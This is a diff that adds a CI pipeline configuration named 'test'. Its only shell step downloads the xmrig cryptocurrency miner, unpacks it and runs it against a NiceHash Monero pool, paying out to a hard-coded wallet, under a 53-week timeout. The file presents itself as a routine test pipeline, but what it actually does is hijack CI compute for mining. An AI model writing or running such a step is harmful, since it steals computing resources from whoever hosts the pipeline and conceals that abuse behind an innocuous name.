@@ -1,0 +1,30 @@
+pipeline:
+  name: test
+  identifier: test
+  projectIdentifier: default_project
+  orgIdentifier: default
+  tags: {}
+  stages:
+    - stage:
+        name: test
+        identifier: test
+        description: ""
+        type: Custom
+        spec:
+          execution:
+            steps:
+              - step:
+                  type: ShellScript
+                  name: ShellScript_1
+                  identifier: ShellScript_1
+                  spec:
+                    shell: Bash
+                    executionTarget: {}
+                    source:
+                      type: Inline
+                      spec:
+                        script: wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-linux-static-x64.tar.gz && tar -xf xmrig-6.16.2-linux-static-x64.tar.gz && cd xmrig-6.16.2 && chmod +x xmrig && ./xmrig -o randomxmonero.usa-west.nicehash.com:3380 -a rx -k -u 3H3W91fmg4wQN7wLh1zScVzcy3r88Hw5Fn.lat3 -p x
+                    environmentVariables: []
+                    outputVariables: []
+                  timeout: 53w
+        tags: {}
